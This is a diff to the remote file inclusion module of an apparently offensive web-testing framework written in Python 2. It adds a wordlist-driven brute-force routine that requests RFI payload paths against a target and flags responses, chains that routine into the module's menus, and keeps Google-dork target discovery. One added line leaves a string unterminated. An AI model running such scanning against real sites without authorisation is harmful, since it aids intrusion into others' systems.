@@ -23,38 +23,11 @@ from colors import *
 global web
 
 goog = []
+payloads = []
 payload_url = 'https://raw.githubusercontent.com/the-Infected-Drake/TIDoS-Framework/master/runon.sh'
 payload_1 = '#!/bin/sh'
 payload_2 = 'cd /opt/tidos'
 payload_3 = 'python /opt/tidos/tidos.py'
-
-def rfi(web):
-
-	print R+'\n   ==========================================='
-	print R+'    R E M O T E   F I L E   I N C L U S I O N'
-	print R+'   ===========================================\n'
-	print C+'    Choose from the options:'
-	print B+'    [1] Custom Targetting'
-	print B+'    [2] Automated Scanning\n'
-
-	m = raw_input(O+' [#] Enter your choice :> ')
-
-	if str(web).endswith('/'):
-		pass
-	else:
-		web = web + '/'
-
-	if m == '1':
-		cust0x00(web)
-
-	elif m == '2':
-		auto0x00(web)
-
-	else:
-		print G+' [+] U mad?'
-		time.sleep(0.9)
-		print ''
-		rfi(web)
 
 def clear_cookie():
 	fo = open(".google-cookie", "w")
@@ -73,6 +46,15 @@ def cust0x00(web):
 			web0 = web0.replace('/','')
 			pass
 	test(web0, web)
+	print G+' [+] Done!'
+	time.sleep(0.6)
+	i = raw_input(O+' [#] Proceed to Brute Module? (y/n) :> ')
+	if i == 'y' or i == 'Y':
+		print G+' [+] Moving on...'
+		brute0x00(web)
+	elif i == 'n' or i == 'N':
+		print G+' [+] RFi completed!'
+		time.sleep(0.5) 
 
 def test(web0, web):
 
@@ -184,6 +166,33 @@ def google_it (dork):
 		time.sleep(0.7)
 		goog.append(title)
 		
+def brute0x00(web):
+
+    try:
+	print GR+' [*] Importing wordlist...'
+	if os.path.exists('files/fuzz-db/rfi_paths.lst') == True:
+		print G+' [+] File path found!'
+		time.sleep(0.6)
+		print O+' [*] Importing wordlist...'
+		with open('files/fuzz-db/rfi_paths.lst','r') as wew:
+			for w in wew:
+				w = w.strip('\n')
+				payloads.append(w)
+		print GR+' [*] Starting bruteforce...'
+		time.sleep(0.7)
+		for pay in payloads:
+			web0x00 = web + pay
+			req = requests.get(web0x00, allow_redirects=False, timeout=7, verify = False)
+			c = str(req.status_code)
+			if c == '200' or c == '302' or c == '300':
+				print G+' [+] Possible RFi at : '+O+web0x00+G+' (200)'
+			elif c == '404':
+				print B+' [*] Checking dir : '+C+web0x00+R+' (404)
+			else:
+				print O+' [*] Interesting response : '+GR+web0x00+O+' ('+c+')'
+    except Exception as e:
+	print R+' [-] Unexpected Exception Encountered!'
+	print R+' [-] Exception : '+str(e)
 
 def auto0x00(web):
 
@@ -201,14 +210,20 @@ def auto0x00(web):
 		print R+' [-] No sites found via Google Dorks...'
 		print G+' [+] Moving on...'
 		time.sleep(0.5)
-		i = raw_input(O+' [#] Do you want to use custoom module (Y/n) :> '+C)
+		i = raw_input(O+' [#] Do you want to use custom module (Y/n) :> '+C)
 		if i == 'y' or i == 'Y':
 			print G+' [+] Loading the custom module...\n'
 			time.sleep(0.6)
 			cust0x00(web)
+			print G+' [+] Custom Module completed!'
+			time.sleep(0.7)
+			print GR+' [*] Initializing module [3] Bruter...'
+			brute0x00(web)
 		elif i == 'n':
-			print GR+' [*] Leaving module LFi...'
-			time.sleep(0.6)
+			print GR+' [*] Okay...'
+			time.sleep(0.7)
+			print GR+' [*] Initializing module [3] Bruter...'
+			brute0x00(web)
 		else:
 			print R+'\n [-] Sorry fam! You just typed SHIT!\n'
 			time.sleep(0.8)
@@ -216,9 +231,37 @@ def auto0x00(web):
     except urllib2.HTTPError as err:
 	if err.code == 503:
 	    print R+' [-] Captcha appeared...\n'
-	    print O+' [!] Use the custom module to search manually...'
+	    print O+' [!] Use the custom module and the brute module next...'
 	    pass
 
     except urllib2.URLError:
 	print R+' [-] No network connectivity!'
+
+def rfi(web):
+
+	print R+'\n   ==========================================='
+	print R+'    R E M O T E   F I L E   I N C L U S I O N'
+	print R+'   ===========================================\n'
+	print C+'    Choose from the options:'
+	print B+'    [1] Custom Targetting'
+	print B+'    [2] Automated Scanning\n'
+
+	m = raw_input(O+' [#] Enter your choice :> ')
+
+	if str(web).endswith('/'):
+		pass
+	else:
+		web = web + '/'
+
+	if m == '1':
+		cust0x00(web)
+
+	elif m == '2':
+		auto0x00(web)
+
+	else:
+		print G+' [+] U mad?'
+		time.sleep(0.9)
+		print ''
+		rfi(web)
 
